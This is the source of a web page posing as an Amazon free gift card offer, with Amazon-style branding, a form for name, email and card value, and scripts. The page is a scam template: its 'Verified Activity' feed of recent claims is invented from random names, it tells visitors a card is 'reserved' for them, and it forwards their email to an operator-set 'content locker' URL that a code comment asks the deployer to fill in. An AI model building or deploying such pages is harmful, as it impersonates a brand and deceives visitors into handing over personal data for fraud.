<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Amazon Gift Card - Free Promotional Offer</title>
    <meta
      name="description"
      content="Get your free Amazon Gift Card today. Quick registration, instant delivery to your email. Limited time promotional offer."
    />
    <style>
      :root {
        --amazon-orange: #ff9900;
        --amazon-orange-dark: #e47911;
        --amazon-blue: #232f3e;
        --amazon-blue-light: #37475a;
        --amazon-yellow: #febd69;
        --amazon-bg: #eaeded;
        --amazon-white: #ffffff;
        --amazon-text: #0f1111;
        --amazon-text-light: #565959;
        --amazon-border: #d5d9d9;
        --amazon-border-light: #e7e7e7;
        --amazon-success: #067d62;
        --amazon-success-bg: #d1f2eb;
        --shadow-light: 0 2px 5px 0 rgba(213,217,217,.5);
        --shadow-medium: 0 4px 8px 0 rgba(0,0,0,.1);
      }

      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: "Amazon Ember", Arial, sans-serif;
        background-color: var(--amazon-bg);
        color: var(--amazon-text);
        line-height: 1.4;
      }

      /* Amazon-style header */
      .header {
        background: linear-gradient(to bottom, #37475a, #232f3e);
        color: white;
        padding: 0;
        position: relative;
      }

      .header-top {
        background: var(--amazon-blue);
        padding: 8px 0;
        border-bottom: 1px solid var(--amazon-blue-light);
      }

      .header-container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px 10px 20px;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .logo-section {
        display: flex;
        align-items: center;
        gap: 15px;
      }

      .amazon-logo {
        font-size: 37px;
        font-weight: bold;
        color: white;
        text-decoration: none;
        position: relative;
		letter-spacing: 2.2px;
		margin-bottom: 5px;
      }

      .amazon-logo::after {
        content: '';
        position: absolute;
        bottom: 0px;
        left: 0;
        right: 0;
        height: 4px;
		width: 51%;
		margin-inline: auto;
        background: var(--amazon-orange);
        border-radius: 4px;
      }

      .header-info {
        display: flex;
        gap: 20px;
        font-size: 12px;
        color: #cccccc;
      }

      .info-item {
        display: flex;
        align-items: center;
        gap: 5px;
      }

      .info-item::before {
        content: 'âœ“';
        color: var(--amazon-orange);
        font-weight: bold;
      }

      /* Main content */
      .main-container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 30px 20px;
        display: grid;
        grid-template-columns: 1fr 350px;
        gap: 30px;
        align-items: start;
      }

      /* Left column - main form */
      .main-content {
        background: var(--amazon-white);
        border: 1px solid var(--amazon-border);
        border-radius: 8px;
        overflow: hidden;
        box-shadow: var(--shadow-light);
        display: flex;
        flex-direction: column;
        min-height: 600px;
      }

      .content-header {
        background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
        padding: 25px 30px;
        border-bottom: 1px solid var(--amazon-border-light);
      }

      .title-container {
		display: flex;
        align-items: start;
        gap: 12px;
        margin-bottom: 8px;
        flex-wrap: wrap;
        align-content: start;
        flex-direction: column;
      }

      /* Orange Limited Offer Badge at beginning of title */
      .benefit-tag {
        background: var(--amazon-orange);
        color: white;
        padding: 7px 9px;
        border-radius: 4px;
        font-size: 11px;
        font-weight: bold;
		letter-spacing: 2px;
        text-transform: uppercase;
        display: inline-block;
        flex-shrink: 0;
      }

      .main-title {
        font-size: 28px;
        font-weight: bold;
        color: var(--amazon-text);
        line-height: 1.2;
        margin: 0;
      }

      .subtitle {
        color: var(--amazon-text-light);
        font-size: 16px;
		max-width: 550px;
      }

      /* Form styling */
      .form-container {
        padding: 26px 30px;
        flex: 1;
      }

      .form-grid {
        display: grid;
        gap: 20px;
      }

      .form-row {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 15px;
      }

      .form-group {
        display: flex;
        flex-direction: column;
      }

      .form-group.full-width {
        grid-column: 1 / -1;
      }

      label {
        font-size: 14px;
        font-weight: 700;
        color: var(--amazon-text);
        margin-bottom: 5px;
      }

      input, select {
        height: 44px;
        padding: 8px 12px;
        border: 1px solid var(--amazon-border);
        border-radius: 4px;
        font-size: 14px;
        background: white;
        transition: border-color 0.2s, box-shadow 0.2s;
      }

      input:focus, select:focus {
        outline: none;
        border-color: var(--amazon-orange);
        box-shadow: 0 0 0 2px rgba(255, 153, 0, 0.2);
      }

      .button-group {
        display: flex;
        gap: 15px;
      }

      .btn {
        height: 44px;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 400;
        cursor: pointer;
        transition: all 0.2s;
        border: 1px solid;
        display: flex;
        align-items: center;
        justify-content: center;
        text-decoration: none;
      }

      .btn-secondary {
        background: white;
        border-color: var(--amazon-border);
        color: var(--amazon-text);
        padding: 0 20px;
      }

      .btn-secondary:hover {
        background: #f7f8f8;
      }

      .btn-primary {
        background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
        border-color: #a88734 #9c7e31 #846a29;
        color: var(--amazon-text);
        flex: 1;
        min-width: 200px;
        font-weight: 500;
        box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
      }

      .btn-primary:hover {
        background: linear-gradient(to bottom, #f5d78e, #eeb933);
      }

      .btn-primary:disabled {
        background: #ddd;
        border-color: #aaa;
        color: #666;
        cursor: not-allowed;
      }

      /* One line process steps with orange numbers */
      .process-steps {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 30px;
        margin-bottom: 20px;
        padding: 16px 20px;
        background: #fafbfc;
        border-radius: 6px;
        border: 1px solid #f0f0f0;
      }

      .step {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 13px;
        color: #4b5563;
        font-weight: 400;
      }

      .step-number {
        background: var(--amazon-orange);
        color: white;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 11px;
        font-weight: 600;
        flex-shrink: 0;
      }

      .form-footer {
        background: #f8f9fa;
        padding: 20px 30px;
        border-top: 1px solid var(--amazon-border-light);
        text-align: center;
        margin-top: auto;
      }

      .disclaimer {
        font-size: 12px;
        color: var(--amazon-text-light);
        line-height: 1.4;
      }

      /* Right sidebar */
      .sidebar {
        background: var(--amazon-white);
        border: 1px solid var(--amazon-border);
        border-radius: 8px;
        overflow: hidden;
        box-shadow: var(--shadow-light);
        position: sticky;
        top: 20px;
        display: flex;
        flex-direction: column;
        min-height: 600px;
      }

      .sidebar-header {
        background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
        padding: 10px 20px;
        border-bottom: 1px solid var(--amazon-border-light);
        text-align: center;
      }

      .sidebar-title {
        font-size: 16px;
        font-weight: 700;
        color: var(--amazon-text);
        margin-bottom: 5px;
      }

      .verified-badge {
        background: var(--amazon-success-bg);
        color: var(--amazon-success);
        padding: 4px 12px;
        border-radius: 12px;
        font-size: 11px;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        display: inline-flex;
        align-items: center;
        gap: 4px;
      }

      .verified-badge::before {
        content: 'âœ“';
        font-weight: bold;
      }

      .activity-feed {
        flex: 1;
        overflow-y: auto;
        padding: 13px 15px;
        max-height: 479px;
      }

      .activity-item {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 12px;
        margin-bottom: 8px;
        background: #fafafa;
        border-radius: 6px;
        border: 1px solid var(--amazon-border-light);
      }

      .activity-avatar {
        width: 32px;
        height: 32px;
        background: var(--amazon-orange);
        color: white;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        font-size: 12px;
        flex-shrink: 0;
      }

      .activity-content {
        flex: 1;
        min-width: 0;
      }

      .activity-name {
        font-size: 13px;
        font-weight: 600;
        color: var(--amazon-text);
        margin-bottom: 2px;
      }

      .activity-action {
        font-size: 11px;
        color: var(--amazon-text-light);
        display: flex;
        align-items: center;
        gap: 4px;
      }

      .gift-amount {
        background: var(--amazon-success-bg);
        color: var(--amazon-success);
        padding: 2px 6px;
        border-radius: 3px;
        font-weight: 600;
        font-size: 10px;
      }

      .activity-time {
        font-size: 10px;
        color: var(--amazon-text-light);
        white-space: nowrap;
      }

      .sidebar-footer {
        padding: 15px 20px;
        background: #f8f9fa;
        border-top: 1px solid var(--amazon-border-light);
        font-size: 11px;
        color: var(--amazon-text-light);
        text-align: center;
        line-height: 1.4;
        margin-top: auto;
      }

      /* Toast notification */
      .toast {
        position: fixed;
        top: 20px;
        right: 20px;
        background: var(--amazon-white);
        border: 1px solid var(--amazon-border);
        border-left: 4px solid var(--amazon-orange);
        border-radius: 4px;
        padding: 15px 20px;
        box-shadow: var(--shadow-medium);
        font-size: 14px;
        color: var(--amazon-text);
        max-width: 350px;
        transform: translateX(400px);
        transition: transform 0.3s ease;
        z-index: 1000;
      }

      .toast.show {
        transform: translateX(0);
      }

      /* Enhanced Redirect notification overlay */
      .redirect-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.85);
        backdrop-filter: blur(5px);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 2000;
        animation: fadeIn 0.3s ease-out;
      }

      @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
      }

      @keyframes slideUp {
        from { 
          transform: translateY(30px);
          opacity: 0;
        }
        to { 
          transform: translateY(0);
          opacity: 1;
        }
      }

      @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
      }

      @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }

      .redirect-modal {
        background: var(--amazon-white);
        border-radius: 16px;
        padding: 40px 30px;
        max-width: 450px;
        width: 90%;
        text-align: center;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        position: relative;
        animation: slideUp 0.4s ease-out;
        border: 1px solid var(--amazon-border-light);
      }

      .success-icon {
        width: 80px;
        height: 80px;
        background: linear-gradient(135deg, var(--amazon-success), #0a9e7a);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 20px auto;
        font-size: 40px;
        color: white;
        animation: pulse 2s infinite;
        box-shadow: 0 8px 25px rgba(6, 125, 98, 0.3);
      }

      .redirect-modal h3 {
        color: var(--amazon-text);
        margin-bottom: 12px;
        font-size: 24px;
        font-weight: 700;
      }

      .redirect-modal .subtitle {
        color: var(--amazon-text-light);
        margin-bottom: 30px;
        line-height: 1.6;
        font-size: 16px;
      }

      /* Enhanced Timer Design */
      .timer-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 20px;
        margin: 30px 0;
      }

      .timer-circle {
        position: relative;
        width: 120px;
        height: 120px;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .timer-svg {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        transform: rotate(-90deg);
      }

      .timer-circle-bg {
        fill: none;
        stroke: #f0f0f0;
        stroke-width: 8;
      }

      .timer-circle-progress {
        fill: none;
        stroke: var(--amazon-orange);
        stroke-width: 8;
        stroke-linecap: round;
        transition: stroke-dashoffset 1s linear;
        filter: drop-shadow(0 0 8px rgba(255, 153, 0, 0.4));
      }

      .timer-number {
        position: relative;
        font-size: 36px;
        font-weight: 700;
        color: var(--amazon-orange);
        z-index: 1;
        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }

      .timer-label {
        font-size: 14px;
        color: var(--amazon-text-light);
        font-weight: 500;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      .redirect-info {
        background: linear-gradient(135deg, #f8f9ff, #f0f4ff);
        border: 1px solid #e0e7ff;
        border-radius: 12px;
        padding: 20px;
        margin: 25px 0;
      }

      .redirect-info-title {
        font-size: 16px;
        font-weight: 600;
        color: var(--amazon-text);
        margin-bottom: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .redirect-info-title::before {
        content: 'ðŸ”’';
        font-size: 18px;
      }

      .redirect-info-text {
        font-size: 14px;
        color: var(--amazon-text-light);
        line-height: 1.5;
      }

      .loading-dots {
        display: flex;
        justify-content: center;
        gap: 4px;
        margin-top: 15px;
      }

      .loading-dot {
        width: 8px;
        height: 8px;
        background: var(--amazon-orange);
        border-radius: 50%;
        animation: loadingDots 1.4s infinite ease-in-out;
      }

      .loading-dot:nth-child(1) { animation-delay: -0.32s; }
      .loading-dot:nth-child(2) { animation-delay: -0.16s; }
      .loading-dot:nth-child(3) { animation-delay: 0s; }

      @keyframes loadingDots {
        0%, 80%, 100% {
          transform: scale(0.8);
          opacity: 0.5;
        }
        40% {
          transform: scale(1);
          opacity: 1;
        }
      }

      /* Custom scrollbar for activity feed */
      .activity-feed::-webkit-scrollbar {
        width: 6px;
      }

      .activity-feed::-webkit-scrollbar-track {
        background: #f1f1f1;
        border-radius: 3px;
      }

      .activity-feed::-webkit-scrollbar-thumb {
        background: var(--amazon-border);
        border-radius: 3px;
      }

      .activity-feed::-webkit-scrollbar-thumb:hover {
        background: #999;
      }

      /* Mobile responsive design - main form first, sidebar second */
      @media (max-width: 900px) {
        .main-container {
          grid-template-columns: 1fr;
          gap: 20px;
          padding: 20px 15px;
        }

        /* Main content stays in natural order (first) */
        .main-content {
          order: 1;
          min-height: auto;
        }

        /* Sidebar comes after main content (second) */
        .sidebar {
          order: 2;
          position: static;
          min-height: auto;
          height: 600px;
        }

        .activity-feed {
          max-height: calc(600px - 120px);
        }

        .form-row {
          grid-template-columns: 1fr;
          gap: 15px;
        }

        .button-group {
          flex-direction: column;
        }

        .btn-primary {
          min-width: auto;
          height: 48px;
		  flex: auto;
        }

        .process-steps {
          gap: 8px;
          padding: 12px 16px;
        }

        .header-info {
          display: none;
        }

        .content-header {
          padding: 20px 15px;
        }

        .form-container {
          padding: 20px 15px;
        }

        .main-title {
          font-size: 24px;
        }

        .title-container {
          flex-direction: column;
          align-items: flex-start;
          gap: 8px;
        }

        .benefit-tag {
          font-size: 10px;
          padding: 3px 10px;
        }

        .redirect-modal {
          padding: 30px 20px;
          width: 95%;
          max-width: 400px;
        }

        .timer-circle {
          width: 100px;
          height: 100px;
        }

        .timer-number {
          font-size: 30px;
        }

        .success-icon {
          width: 60px;
          height: 60px;
          font-size: 30px;
        }
      }

      @media (max-width: 768px) {
        .content-header {
          padding: 20px;
        }

        .form-container {
          padding: 20px;
        }

        .toast {
          top: 10px;
          right: 10px;
          left: 10px;
          max-width: none;
          transform: translateY(-100px);
        }

        .toast.show {
          transform: translateY(0);
        }

        .process-steps {
          gap: 15px;
        }

        .redirect-modal {
          padding: 25px 20px;
          width: 95%;
        }
      }

      @media (max-width: 480px) {
        .header-container {
          padding: 0 15px;
        }

        .logo-section {
          gap: 10px;
		  padding-bottom: 13px;
        }

        .amazon-logo {
          font-size: 35px;
        }

        .main-container {
          padding: 15px 10px;
        }

        .content-header {
          padding: 15px 20px;
        }

        .form-container {
          padding: 15px 20px;
        }

        .main-title {
          font-size: 22px;
        }

        .subtitle {
          font-size: 14px;
        }

        .btn-primary {
          height: 50px;
          font-size: 15px;
        }

        .benefit-tag {
          font-size: 9px;
          padding: 2px 8px;
        }

        .step {
          font-size: 12px;
        }

        .step-number {
          width: 18px;
          height: 18px;
          font-size: 10px;
        }

        .process-steps {
          gap: 10px;
        }

        .redirect-modal {
          padding: 20px 15px;
        }

        .redirect-modal h3 {
          font-size: 20px;
        }

        .timer-circle {
          width: 90px;
          height: 90px;
        }

        .timer-number {
          font-size: 26px;
        }
      }
    </style>
  </head>
  <body>
    <!-- Header -->
    <header class="header">
      <div class="header-top">
        <div class="header-container">
          <div class="logo-section">
            <a href="#" class="amazon-logo">amazon</a>
          </div>
        </div>
      </div>
    </header>

    <!-- Main Content -->
    <div class="main-container">
      <!-- Left Column - Main Form -->
      <main class="main-content">
        <div class="content-header">
          <div class="title-container">
            <span class="benefit-tag">LIMITED OFFER</span>
            <h1 class="main-title">Get Your Free Amazon Gift Card</h1>
          </div>
          <p class="subtitle">Complete the form below and receive your digital gift card code via email within minutes.</p>
        </div>

        <div class="form-container">
          <div class="process-steps">
            <div class="step">
              <span class="step-number">1</span>
              <span>Enter details</span>
            </div>
            <div class="step">
              <span class="step-number">2</span>
              <span>Choose value</span>
            </div>
            <div class="step">
              <span class="step-number">3</span>
              <span>Receive email</span>
            </div>
          </div>

          <form id="giftCardForm" class="form-grid">
            <div class="form-row">
              <div class="form-group">
                <label for="firstName">First Name</label>
                <input type="text" id="firstName" name="firstName" placeholder="John" required>
              </div>
              <div class="form-group">
                <label for="lastName">Last Name</label>
                <input type="text" id="lastName" name="lastName" placeholder="Doe" required>
              </div>
            </div>

            <div class="form-group full-width">
              <label for="email">Email Address</label>
              <input type="email" id="email" name="email" placeholder="john.doe@example.com" required>
            </div>

            <div class="form-group full-width">
              <label for="giftCardValue">Select Gift Card Value</label>
              <select id="giftCardValue" name="giftCardValue" required>
                <option value="">Choose your gift card amount</option>
                <option value="25">$25 Amazon Gift Card</option>
                <option value="50">$50 Amazon Gift Card</option>
                <option value="75">$75 Amazon Gift Card</option>
                <option value="100">$100 Amazon Gift Card</option>
              </select>
            </div>

            <div class="button-group">
              <button type="button" class="btn btn-secondary" id="checkAvailability">
                Check Availability
              </button>
              <button type="submit" class="btn btn-primary" id="submitForm">
                Get My Gift Card Now
              </button>
            </div>
          </form>
        </div>
      </main>

      <!-- Right Sidebar -->
      <aside class="sidebar">
        <div class="sidebar-header">
          <h2 class="sidebar-title">Recent Claims</h2>
          <span class="verified-badge">Verified Activity</span>
        </div>

        <div class="activity-feed" id="activityFeed">
          <!-- Activity items will be populated by JavaScript -->
        </div>

        <div class="sidebar-footer">
          <p>This is a promotional offer not affiliated with Amazon.com, Inc. All gift cards are sourced through authorized channels.</p>
        </div>
      </aside>
    </div>

    <!-- Toast Notification -->
    <div class="toast" id="toast"></div>

    <!-- Enhanced Redirect Overlay -->
    <div class="redirect-overlay" id="redirectOverlay">
      <div class="redirect-modal">
        <div class="success-icon">ðŸŽ‰</div>
        
        <h3>Congratulations!</h3>
        <p class="subtitle">Your gift card request has been processed successfully.</p>
        
        <div class="timer-container">
          <div class="timer-circle">
            <svg class="timer-svg" viewBox="0 0 120 120">
              <circle class="timer-circle-bg" cx="60" cy="60" r="54"></circle>
              <circle class="timer-circle-progress" cx="60" cy="60" r="54" 
                      stroke-dasharray="339.292" 
                      stroke-dashoffset="339.292"
                      id="timerProgress"></circle>
            </svg>
            <div class="timer-number" id="countdown">5</div>
          </div>
          <div class="timer-label">Redirecting in <span id="countdownText">5</span> seconds</div>
        </div>
      </div>
    </div>

    <script>
      // Configuration - CHANGE THIS URL TO YOUR CONTENT LOCKER URL
      const CONTENT_LOCKER_URL = 'https://google.com';

      
      const GIFT_CARD_OPTIONS = [
        { value: '25', label: '$25 Amazon Gift Card' },
        { value: '50', label: '$50 Amazon Gift Card' },
        { value: '75', label: '$75 Amazon Gift Card' },
        { value: '100', label: '$100 Amazon Gift Card' }
      ];

      const SAMPLE_NAMES = [
        'Sarah M.', 'Michael R.', 'Jennifer L.', 'David K.', 'Lisa P.',
        'Robert S.', 'Amanda T.', 'James W.', 'Michelle C.', 'Christopher H.',
        'Jessica B.', 'Matthew D.', 'Ashley F.', 'Daniel G.', 'Emily J.',
        'Andrew N.', 'Rachel V.', 'Kevin M.', 'Stephanie Q.', 'Brandon X.'
      ];

      // DOM Elements
      const form = document.getElementById('giftCardForm');
      const checkBtn = document.getElementById('checkAvailability');
      const submitBtn = document.getElementById('submitForm');
      const toast = document.getElementById('toast');
      const activityFeed = document.getElementById('activityFeed');
      const redirectOverlay = document.getElementById('redirectOverlay');
      const countdown = document.getElementById('countdown');
      const countdownText = document.getElementById('countdownText');
      const timerProgress = document.getElementById('timerProgress');

      // Timer circle configuration
      const CIRCLE_RADIUS = 54;
      const CIRCLE_CIRCUMFERENCE = 2 * Math.PI * CIRCLE_RADIUS;

      // Utility functions
      const getRandomName = () => SAMPLE_NAMES[Math.floor(Math.random() * SAMPLE_NAMES.length)];
      const getRandomGiftCard = () => GIFT_CARD_OPTIONS[Math.floor(Math.random() * GIFT_CARD_OPTIONS.length)];
      const getRandomMinutes = () => Math.floor(Math.random() * 15) + 1;

      const showToast = (message, duration = 4000) => {
        toast.textContent = message;
        toast.classList.add('show');
        setTimeout(() => {
          toast.classList.remove('show');
        }, duration);
      };

      const formatTimeAgo = (minutes) => {
        if (minutes === 1) return '1 min ago';
        return `${minutes} min ago`;
      };

      // Enhanced redirect function with animated timer
      const redirectToContentLocker = (giftCardValue, userEmail) => {
        // Build the redirect URL with parameters
        let redirectUrl = CONTENT_LOCKER_URL;
        
        // Add URL parameters if needed
        const params = new URLSearchParams({
          source: 'amazon-gift-card',
          value: giftCardValue,
          email: userEmail,
          timestamp: Date.now()
        });
        
        // Only add parameters if the base URL is set
        if (redirectUrl && redirectUrl !== 'https://www.google.com') {
          redirectUrl += (redirectUrl.includes('?') ? '&' : '?') + params.toString();
        }
        
        // Show redirect overlay
        redirectOverlay.style.display = 'flex';
        
        let timeLeft = 5;
        const totalTime = 5;
        
        // Initialize progress circle
        timerProgress.style.strokeDashoffset = CIRCLE_CIRCUMFERENCE;
        
        const countdownInterval = setInterval(() => {
          timeLeft--;
          
          // Update countdown numbers
          countdown.textContent = timeLeft;
          countdownText.textContent = timeLeft;
          
          // Update progress circle
          const progress = (totalTime - timeLeft) / totalTime;
          const offset = CIRCLE_CIRCUMFERENCE - (progress * CIRCLE_CIRCUMFERENCE);
          timerProgress.style.strokeDashoffset = offset;
          
          if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            
            // Redirect to content locker or show message if URL not configured
            if (redirectUrl && redirectUrl !== 'https://www.google.com') {
              window.location.href = redirectUrl;
            } else {
              // If no URL is configured, show a message
              redirectOverlay.querySelector('.redirect-modal').innerHTML = `
                <p class="subtitle">Oops! Something went wrong. Please try again in a little while.</p>
                <button onclick="redirectOverlay.style.display='none'" class="btn btn-primary" style="margin: 20px auto 0 auto; width: auto; padding: 0 20px; height: 44px;">Close</button>
              `;
            }
          }
        }, 1000);
      };

      // Activity feed management
      let activities = [];

      const createActivity = (name = null, giftCard = null) => {
        return {
          id: Date.now() + Math.random(),
          name: name || getRandomName(),
          giftCard: giftCard || getRandomGiftCard(),
          minutesAgo: getRandomMinutes()
        };
      };

      const renderActivity = (activity) => {
        const initial = activity.name.charAt(0).toUpperCase();
        return `
          <div class="activity-item">
            <div class="activity-avatar">${initial}</div>
            <div class="activity-content">
              <div class="activity-name">${activity.name}</div>
              <div class="activity-action">
                claimed <span class="gift-amount">${activity.giftCard.label}</span>
              </div>
            </div>
            <div class="activity-time">${formatTimeAgo(activity.minutesAgo)}</div>
          </div>
        `;
      };

      const updateActivityFeed = () => {
        activityFeed.innerHTML = activities.map(renderActivity).join('');
      };

      const addActivity = (activity) => {
        activities.unshift(activity);
        if (activities.length > 12) {
          activities = activities.slice(0, 12);
        }
        updateActivityFeed();
      };

      // Initialize activity feed
      const initializeActivities = () => {
        for (let i = 0; i < 8; i++) {
          activities.push(createActivity());
        }
        updateActivityFeed();
      };

      // Update times periodically
      const updateActivityTimes = () => {
        activities.forEach(activity => {
          activity.minutesAgo = Math.min(activity.minutesAgo + Math.floor(Math.random() * 2) + 1, 60);
        });
        updateActivityFeed();
      };

      // Form validation
      const validateForm = () => {
        const firstName = document.getElementById('firstName').value.trim();
        const lastName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const giftCardValue = document.getElementById('giftCardValue').value;

        if (!firstName) {
          showToast('Please enter your first name.');
          return false;
        }

        if (!lastName) {
          showToast('Please enter your last name.');
          return false;
        }

        if (!email) {
          showToast('Please enter your email address.');
          return false;
        }

        if (!email.includes('@') || !email.includes('.')) {
          showToast('Please enter a valid email address.');
          return false;
        }

        if (!giftCardValue) {
          showToast('Please select a gift card value.');
          return false;
        }

        return true;
      };

      // Event listeners
      checkBtn.addEventListener('click', () => {
        if (!validateForm()) return;

        const firstName = document.getElementById('firstName').value.trim();
        const giftCardValue = document.getElementById('giftCardValue').value;
        const selectedGiftCard = GIFT_CARD_OPTIONS.find(option => option.value === giftCardValue);

        showToast(`Great news ${firstName}! ${selectedGiftCard.label} is available and reserved for you.`);
      });

      form.addEventListener('submit', (e) => {
        e.preventDefault();
        
        if (!validateForm()) return;

        const firstName = document.getElementById('firstName').value.trim();
        const lastName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const giftCardValue = document.getElementById('giftCardValue').value;
        const selectedGiftCard = GIFT_CARD_OPTIONS.find(option => option.value === giftCardValue);

        // Disable submit button
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';

        // Show processing message
        showToast(`Processing your ${selectedGiftCard.label} request...`);

        // Simulate processing delay
        setTimeout(() => {
          // Add user to activity feed
          const userActivity = createActivity(
            `${firstName} ${lastName.charAt(0)}.`,
            selectedGiftCard
          );
          userActivity.minutesAgo = 0; // Just now
          addActivity(userActivity);

          // Show success message
          showToast(`Redirecting to complete the process...`, 3000);

          // Reset form
          form.reset();
          
          // Re-enable submit button
          submitBtn.disabled = false;
          submitBtn.textContent = 'Get My Gift Card Now';

          // Redirect to content locker after a short delay
          setTimeout(() => {
            redirectToContentLocker(giftCardValue, email);
          }, 1500);
        }, 2000);
      });

      // Initialize the page
      document.addEventListener('DOMContentLoaded', () => {
        initializeActivities();
        
        // Add new activities periodically
        setInterval(() => {
          addActivity(createActivity());
        }, 8000);

        // Update activity times
        setInterval(updateActivityTimes, 30000);
      });

      // Cleanup on page unload
      window.addEventListener('beforeunload', () => {
        // Clear any running intervals
      });
    </script>
  </body>
</html>